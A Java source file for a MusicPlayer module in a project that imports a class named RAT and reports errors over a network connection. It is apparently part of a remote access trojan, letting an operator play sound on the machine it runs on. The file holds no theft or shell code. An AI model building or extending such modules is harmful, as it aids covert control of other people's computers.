package electron.functions.player;

import java.io.File;
import java.io.IOException;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;

import electron.RAT;
import electron.console.logger;
import electron.networking.Connection;
import electron.networking.packets.ErrorPacket;

public class MusicPlayer extends Thread {
	private File filename;

	public MusicPlayer(File f) {
		filename = f;
	}

	public void run() {
		if (RAT.isNativeImage) {
			logger.warn("[electron.functions.player.MusicPlayer]: unsupported installation type.");
			ErrorPacket.sendError("MusicPlayer can't play sound: unsupported installation type. (native-image)");
			return;
		}
		try {
			Clip clip = AudioSystem.getClip();
			clip.open(AudioSystem.getAudioInputStream(filename));
			clip.start();
			try {
				Thread.sleep(clip.getMicrosecondLength() / 1000L);
			} catch (InterruptedException e) {
				// If we stopping track
			}
			clip.stop();
			clip.close();
			return;
		} catch (LineUnavailableException e) {
			Connection.sendMessage("[PLAYER][ERROR]: " + e.getMessage());
		} catch (IOException e) {
			Connection.sendMessage("[PLAYER][ERROR]: " + e.getMessage());
		} catch (UnsupportedAudioFileException e) {
			Connection.sendMessage("[PLAYER][ERROR]: " + e.getMessage());
		}

	}
}
